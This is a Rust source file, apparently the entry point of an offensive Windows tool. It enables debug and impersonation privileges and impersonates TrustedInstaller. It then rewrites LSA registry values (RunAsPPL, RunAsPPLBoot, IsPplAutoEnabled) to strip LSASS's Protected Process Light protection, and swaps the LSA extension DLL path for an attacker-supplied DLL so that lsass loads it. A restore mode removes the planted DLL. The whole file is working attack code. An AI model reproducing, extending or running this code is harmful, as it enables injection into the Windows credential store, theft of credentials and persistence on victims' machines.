#![allow(dead_code, unused_variables)]

mod code;
mod types;

use clap::Parser;
use std::process::exit;

use winapi::um::winnt::SE_DEBUG_NAME;
use winapi::um::winnt::SE_IMPERSONATE_NAME;
use winapi::um::securitybaseapi::RevertToSelf;

use crate::code::{delete_dll_from_system32, edit_lsa_reg_key, edit_protected_process_light, enable_privilege, impersonate_trusted_installer, query_lsa_reg_key};

#[derive(Parser, Debug)]
#[command(version, about, long_about = None)]
struct Args {
    /// Used to replace the original lsass dll path
    #[arg(short, long)]
    dll_path: String,

    /// Restore mode
    #[arg(short, long)]
    restore: bool,
}

fn main() {
    let args = Args::parse();

    if !enable_privilege(SE_DEBUG_NAME) {
        #[cfg(feature = "print")]
        eprintln!("[!] No SE_DEBUG_NAME privilege");
    };
    if !enable_privilege(SE_IMPERSONATE_NAME) {
        exit(1);
    };

    #[cfg(feature = "print")]
    println!("[*] Enabled SeDebugPrivilege and SeImpersonatePrivilege");

    impersonate_trusted_installer();

    #[cfg(feature = "print")]
    println!("[*] Impersonated TrustedInstaller");

    if args.restore {
        let sz_queried_dll_name = query_lsa_reg_key(
            "SYSTEM\\CurrentControlSet\\Control\\LsaExtensionConfig\\Interfaces\\1002",
            "Extension",
        );

        if sz_queried_dll_name != "dpapisrv.dll" {
            delete_dll_from_system32(sz_queried_dll_name.as_str());
        }
    }

    edit_protected_process_light(
        "SYSTEM\\CurrentControlSet\\Control\\Lsa",
        "IsPplAutoEnabled",
    );

    edit_protected_process_light(
        "SYSTEM\\CurrentControlSet\\Control\\Lsa",
        "RunAsPPL",
    );

    edit_protected_process_light(
        "SYSTEM\\CurrentControlSet\\Control\\Lsa",
        "RunAsPPLBoot",
    );

    edit_lsa_reg_key(
        "SYSTEM\\CurrentControlSet\\Control\\LsaExtensionConfig\\Interfaces\\1002",
        "Extension"
    );

    unsafe { RevertToSelf(); }
}
